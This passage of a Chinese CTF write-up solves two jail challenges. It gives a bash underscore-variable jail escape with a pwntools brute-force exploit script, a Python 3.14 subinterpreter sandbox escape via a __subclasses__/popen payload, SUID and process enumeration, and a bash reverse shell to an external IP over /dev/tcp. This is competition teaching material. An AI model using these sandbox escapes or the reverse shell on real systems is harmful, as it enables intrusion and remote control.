</span></span></code></pre></td></tr></table></div></div><p>现在开始<strong>每次左移一个字符</strong>，直到你看到打印出来的串<strong>以</strong> <strong><code>s</code></strong> <strong>开头</strong>为止（也就是变成 <code>s</code> 后面一堆字母）。左移一格的命令是：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nv>__</span><span class=o>=</span><span class=si>${</span><span class=nv>__</span><span class=p>:</span><span class=k>$((</span>!_____<span class=k>))</span><span class=si>}</span>
</span></span></code></pre></td></tr></table></div></div><p>左移一次就再执行一次上面的“打印”命令：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=si>${</span><span class=nv>___</span><span class=si>}</span><span class=k>$(</span><span class=nv>$_</span><span class=k>)</span><span class=si>${</span><span class=nv>__</span><span class=si>}</span>
</span></span></code></pre></td></tr></table></div></div><ul><li>重复“左移 → 打印 → 左移 → 打印”，直到打印出来的第一字符是 <code>s</code>（大概要按很多次，不用数，看到开头是 <code>s</code> 就行）。把这个<strong>首字符</strong>（也就是 <code>s</code>）单独取出来存到变量里：</li></ul><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nv>____</span><span class=o>=</span><span class=si>${</span><span class=nv>__</span><span class=p>:</span><span class=k>$((</span>________<span class=k>))</span><span class=p>:</span><span class=k>$((</span>!_____<span class=k>))</span><span class=si>}</span>
</span></span></code></pre></td></tr></table></div></div><p>处理 <code>___</code>（它现在是 <code>echo</code>），左移两次得到以 <code>h</code> 开头：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nv>___</span><span class=o>=</span><span class=si>${</span><span class=nv>___</span><span class=p>:</span><span class=k>$((</span>!_____<span class=k>))</span><span class=si>}</span>
</span></span><span class=line><span class=cl><span class=nv>___</span><span class=o>=</span><span class=si>${</span><span class=nv>___</span><span class=p>:</span><span class=k>$((</span>!_____<span class=k>))</span><span class=si>}</span>
</span></span></code></pre></td></tr></table></div></div><p>现在是<code>ho</code>，取出这个 <code>h</code>：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nv>_____</span><span class=o>=</span><span class=si>${</span><span class=nv>___</span><span class=p>:</span><span class=k>$((</span>________<span class=k>))</span><span class=p>:</span><span class=k>$((</span>!_____<span class=k>))</span><span class=si>}</span>
</span></span><span class=line><span class=cl><span class=nv>______</span><span class=o>=</span><span class=si>${</span><span class=nv>____</span><span class=si>}${</span><span class=nv>_____</span><span class=si>}</span>
</span></span><span class=line><span class=cl><span class=nv>$______</span>
</span></span></code></pre></td></tr></table></div></div><p>其实<code>$_____</code>就已经是h，但是为了后面不重复键，所以移动到了<code>$______</code>，再构造<code>s</code>，最初的<code>yooooooo_mama_test</code>也就是<code>$1</code>的第十六位为<code>s</code>，通过爆破偏移PID来获得16从而构造出s，但是这样子PID是有局限性的，所以写脚本要限制一下，最终exp如下</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span><span class=lnt>56
</span><span class=lnt>57
</span><span class=lnt>58
</span><span class=lnt>59
</span><span class=lnt>60
</span><span class=lnt>61
</span><span class=lnt>62
</span><span class=lnt>63
</span><span class=lnt>64
</span><span class=lnt>65
</span><span class=lnt>66
</span><span class=lnt>67
</span><span class=lnt>68
</span><span class=lnt>69
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>context</span><span class=o>.</span><span class=n>log_level</span> <span class=o>=</span> <span class=s2>&#34;debug&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>targets</span> <span class=o>=</span> <span class=p>[</span><span class=mi>16</span><span class=o>&lt;&lt;</span><span class=n>i</span> <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>5</span><span class=p>)]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>hsteps</span> <span class=o>=</span> <span class=p>[</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;_=$((!_____))&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;__=${!_}&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;___=$_&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;$</span><span class=si>{___}</span><span class=s2>$($_)$</span><span class=si>{__}</span><span class=s2>&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;__=${__:$((!_____))}&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;$</span><span class=si>{___}</span><span class=s2>$($_)$</span><span class=si>{__}</span><span class=s2>&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;____=${__:$((________)):$((!_____))}&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;___=${___:$((!_____))}&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;___=${___:$((!_____))}&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;_____=${___:$((________)):$((!_____))}&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;______=$</span><span class=si>{____}</span><span class=s2>$</span><span class=si>{_____}</span><span class=s2>&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;$______&#34;</span>
</span></span><span class=line><span class=cl><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>ssteps1</span> <span class=o>=</span> <span class=p>[</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;__=$(())&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;__=$((!$__))&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;____=$(($$))&#34;</span>
</span></span><span class=line><span class=cl><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>ssteps2</span> <span class=o>=</span> <span class=p>[</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;_____=${!__:____:__}&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;$_____&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;$_____$______&#34;</span>
</span></span><span class=line><span class=cl><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>while</span> <span class=kc>True</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=c1>#p = remote(&#34;127.0.0.1&#34;, 4444)</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;&#34;&#34;
</span></span></span><span class=line><span class=cl><span class=s2>    ncat --ssl minijail-1845e80796387fe2.challs.tfcctf.com 1337
</span></span></span><span class=line><span class=cl><span class=s2>    &#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl>    <span class=n>p</span> <span class=o>=</span> <span class=n>remote</span><span class=p>(</span><span class=s2>&#34;minijail-1845e80796387fe2.challs.tfcctf.com&#34;</span><span class=p>,</span> <span class=mi>1337</span><span class=p>,</span> <span class=n>ssl</span><span class=o>=</span><span class=kc>True</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;caca$&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;$(($$))&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>n</span> <span class=o>=</span> <span class=n>p</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;command not found&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>n</span> <span class=o>=</span> <span class=n>n</span><span class=o>.</span><span class=n>decode</span><span class=p>()</span><span class=o>.</span><span class=n>split</span><span class=p>(</span><span class=s1>&#39;:&#39;</span><span class=p>)[</span><span class=mi>2</span><span class=p>]</span><span class=o>.</span><span class=n>strip</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=n>n</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>n</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>n</span> <span class=o>&gt;</span> <span class=nb>max</span><span class=p>(</span><span class=n>targets</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>exit</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>elif</span> <span class=n>n</span> <span class=ow>in</span> <span class=n>targets</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=n>step</span> <span class=ow>in</span> <span class=n>hsteps</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>p</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;caca$&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>p</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>step</span><span class=o>.</span><span class=n>encode</span><span class=p>())</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>x</span> <span class=o>=</span> <span class=n>targets</span><span class=o>.</span><span class=n>index</span><span class=p>(</span><span class=n>n</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=n>step</span> <span class=ow>in</span> <span class=n>ssteps1</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>p</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;caca$&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>p</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>step</span><span class=o>.</span><span class=n>encode</span><span class=p>())</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=n>x</span><span class=p>):</span>
</span></span><span class=line><span class=cl>            <span class=n>p</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;caca$&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>p</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;____=$(($____&gt;&gt;$__))&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=n>step</span> <span class=ow>in</span> <span class=n>ssteps2</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>p</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;caca$&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>p</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>step</span><span class=o>.</span><span class=n>encode</span><span class=p>())</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>p</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
</span></span><span class=line><span class=cl>        <span class=n>exit</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;Number: </span><span class=si>{</span><span class=n>n</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=o>.</span><span class=n>close</span><span class=p>()</span>
</span></span></code></pre></td></tr></table></div></div><h2 id=πjail>ΠJAIL</h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span><span class=lnt>56
</span><span class=lnt>57
</span><span class=lnt>58
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>concurrent</span> <span class=kn>import</span> <span class=n>interpreters</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>threading</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>ctypes</span><span class=o>,</span> <span class=nn>pwd</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>os</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>os</span><span class=o>.</span><span class=n>setgroups</span><span class=p>([])</span>
</span></span><span class=line><span class=cl><span class=n>os</span><span class=o>.</span><span class=n>setgid</span><span class=p>(</span><span class=n>pwd</span><span class=o>.</span><span class=n>getpwnam</span><span class=p>(</span><span class=s2>&#34;nobody&#34;</span><span class=p>)</span><span class=o>.</span><span class=n>pw_gid</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>INPUT</span> <span class=o>=</span> <span class=kc>None</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>safe_eval</span><span class=p>(</span><span class=n>user_input</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>safe_builtins</span> <span class=o>=</span> <span class=p>{}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>blacklist</span> <span class=o>=</span> <span class=p>[</span><span class=s1>&#39;os&#39;</span><span class=p>,</span> <span class=s1>&#39;system&#39;</span><span class=p>,</span> <span class=s1>&#39;subprocess&#39;</span><span class=p>,</span> <span class=s1>&#39;compile&#39;</span><span class=p>,</span> <span class=s1>&#39;code&#39;</span><span class=p>,</span> <span class=s1>&#39;chr&#39;</span><span class=p>,</span> <span class=s1>&#39;str&#39;</span><span class=p>,</span> <span class=s1>&#39;bytes&#39;</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=nb>any</span><span class=p>(</span><span class=n>b</span> <span class=ow>in</span> <span class=n>user_input</span> <span class=k>for</span> <span class=n>b</span> <span class=ow>in</span> <span class=n>blacklist</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;Blacklisted function detected.&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=kc>False</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=nb>any</span><span class=p>(</span><span class=nb>ord</span><span class=p>(</span><span class=n>c</span><span class=p>)</span> <span class=o>&lt;</span> <span class=mi>32</span> <span class=ow>or</span> <span class=nb>ord</span><span class=p>(</span><span class=n>c</span><span class=p>)</span> <span class=o>&gt;</span> <span class=mi>126</span> <span class=k>for</span> <span class=n>c</span> <span class=ow>in</span> <span class=n>user_input</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;Invalid characters detected.&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=kc>False</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>success</span> <span class=o>=</span> <span class=kc>True</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;Result:&#34;</span><span class=p>,</span> <span class=nb>eval</span><span class=p>(</span><span class=n>user_input</span><span class=p>,</span> <span class=p>{</span><span class=s2>&#34;__builtins__&#34;</span><span class=p>:</span> <span class=n>safe_builtins</span><span class=p>},</span> <span class=p>{</span><span class=s2>&#34;__builtins__&#34;</span><span class=p>:</span> <span class=n>safe_builtins</span><span class=p>}))</span>
</span></span><span class=line><span class=cl>    <span class=k>except</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>success</span> <span class=o>=</span> <span class=kc>False</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>success</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>safe_user_input</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=k>global</span> <span class=n>INPUT</span>
</span></span><span class=line><span class=cl>    <span class=c1># drop priv level</span>
</span></span><span class=line><span class=cl>    <span class=n>libc</span> <span class=o>=</span> <span class=n>ctypes</span><span class=o>.</span><span class=n>CDLL</span><span class=p>(</span><span class=kc>None</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>syscall</span> <span class=o>=</span> <span class=n>libc</span><span class=o>.</span><span class=n>syscall</span>
</span></span><span class=line><span class=cl>    <span class=n>nobody_uid</span> <span class=o>=</span> <span class=n>pwd</span><span class=o>.</span><span class=n>getpwnam</span><span class=p>(</span><span class=s2>&#34;nobody&#34;</span><span class=p>)</span><span class=o>.</span><span class=n>pw_uid</span>
</span></span><span class=line><span class=cl>    <span class=n>SYS_setresuid</span> <span class=o>=</span> <span class=mi>117</span>
</span></span><span class=line><span class=cl>    <span class=n>syscall</span><span class=p>(</span><span class=n>SYS_setresuid</span><span class=p>,</span> <span class=n>nobody_uid</span><span class=p>,</span> <span class=n>nobody_uid</span><span class=p>,</span> <span class=n>nobody_uid</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>user_interpreter</span> <span class=o>=</span> <span class=n>interpreters</span><span class=o>.</span><span class=n>create</span><span class=p>()</span>
</span></span><span class=line><span class=cl>        <span class=n>INPUT</span> <span class=o>=</span> <span class=nb>input</span><span class=p>(</span><span class=s2>&#34;Enter payload: &#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>user_interpreter</span><span class=o>.</span><span class=n>call</span><span class=p>(</span><span class=n>safe_eval</span><span class=p>,</span> <span class=n>INPUT</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>user_interpreter</span><span class=o>.</span><span class=n>close</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=k>except</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>pass</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>while</span> <span class=kc>True</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>t</span> <span class=o>=</span> <span class=n>threading</span><span class=o>.</span><span class=n>Thread</span><span class=p>(</span><span class=n>target</span><span class=o>=</span><span class=n>safe_user_input</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>t</span><span class=o>.</span><span class=n>start</span><span class=p>()</span>
</span></span><span class=line><span class=cl>        <span class=n>t</span><span class=o>.</span><span class=n>join</span><span class=p>()</span>
</span></span><span class=line><span class=cl>        
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>INPUT</span> <span class=o>==</span> <span class=s2>&#34;exit&#34;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=k>break</span>
</span></span><span class=line><span class=cl>    <span class=k>except</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;Some error occured&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>break</span>
</span></span></code></pre></td></tr></table></div></div><p>使用 <strong>Python 3.14</strong> 的新特性 <strong>多重****解释器</strong>（<code>concurrent.interpreters</code>），在沙箱中执行用户输入代码。过了一些关键词，以及<code>builtins</code>被清空，所以很多的内置函数都不能使用，而且还被降权了，类似于ssti可以getshell</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=o>()</span>.__class__.__base__.__subclasses__<span class=o>()[</span>166<span class=o>]</span>.__init__.__globals__<span class=o>[</span><span class=s2>&#34;popen&#34;</span><span class=o>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>()</span>.__class__.__base__.__subclasses__<span class=o>()[</span>166<span class=o>]</span>.__init__.__globals__<span class=o>[</span><span class=s2>&#34;popen&#34;</span><span class=o>](</span><span class=s2>&#34;ls / -al&#34;</span><span class=o>)</span>.read<span class=o>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>()</span>.__class__.__base__.__subclasses__<span class=o>()[</span>166<span class=o>]</span>.__init__.__globals__<span class=o>[</span><span class=s2>&#34;popen&#34;</span><span class=o>](</span><span class=s2>&#34;bash -c &#39;bash -i &gt;&amp; /dev/tcp/156.238.233.93/4444 0&gt;&amp;1&#39;&#34;</span><span class=o>)</span>.read<span class=o>()</span>
</span></span></code></pre></td></tr></table></div></div><p>提权就很有意思了，常见的我们找suid位和进程</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=o>()</span>.__class__.__base__.__subclasses__<span class=o>()[</span>166<span class=o>]</span>.__init__.__globals__<span class=o>[</span><span class=s2>&#34;popen&#34;</span><span class=o>](</span><span class=s2>&#34;find / -user root -perm -4000 -print 2&gt;/dev/null&#34;</span><span class=o>)</span>.read<span class=o>()</span>
</span></span><span class=line><span class=cl>/usr/bin/passwd
</span></span><span class=line><span class=cl>/usr/bin/newgrp
</span></span><span class=line><span class=cl>/usr/bin/chfn
</span></span><span class=line><span class=cl>/usr/bin/mount
</span></span><span class=line><span class=cl>/usr/bin/gpasswd
</span></span><span class=line><span class=cl>/usr/bin/umount
</span></span><span class=line><span class=cl>/usr/bin/chsh
</span></span><span class=line><span class=cl>/usr/lib/openssh/ssh-keysign
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>()</span>.__class__.__base__.__subclasses__<span class=o>()[</span>166<span class=o>]</span>.__init__.__globals__<span class=o>[</span><span class=s2>&#34;popen&#34;</span><span class=o>](</span><span class=s2>&#34;ps -ef&#34;</span><span class=o>)</span>.read<span class=o>()</span>
</span></span><span class=line><span class=cl>Result: UID          PID    PPID  C STIME TTY          TIME CMD
</span></span><span class=line><span class=cl>root           <span class=m>1</span>       <span class=m>0</span>  <span class=m>0</span> 03:38 ?        00:00:00 socat TCP-LISTEN:1337,reuseaddr,fork EXEC:python3 /jail.py
</span></span><span class=line><span class=cl>root           <span class=m>8</span>       <span class=m>1</span>  <span class=m>0</span> 03:38 ?        00:00:00 socat TCP-LISTEN:1337,reuseaddr,fork EXEC:python3 /jail.py
</span></span><span class=line><span class=cl>root           <span class=m>9</span>       <span class=m>8</span>  <span class=m>2</span> 03:38 ?        00:00:00 python3 /jail.py
</span></span><span class=line><span class=cl>nobody        <span class=m>11</span>       <span class=m>9</span>  <span class=m>0</span> 03:38 ?        00:00:00 /bin/sh -c ps -ef
</span></span><span class=line><span class=cl>nobody        <span class=m>12</span>      <span class=m>11</span>  <span class=m>0</span> 03:38 ?        00:00:00 ps -ef
</span></span></code></pre></td></tr></table></div></div><p>并没发现什么，由于是在python里面降权，想到同一进程不同线程的权限问题，写个检测脚本</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span><span class=lnt>56
</span><span class=lnt>57
</span><span class=lnt>58
</span><span class=lnt>59
</span><span class=lnt>60
</span><span class=lnt>61
</span><span class=lnt>62
</span><span class=lnt>63
</span><span class=lnt>64
</span><span class=lnt>65
</span><span class=lnt>66
</span><span class=lnt>67
</span><span class=lnt>68
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl><span class=cp>#!/usr/bin/env bash
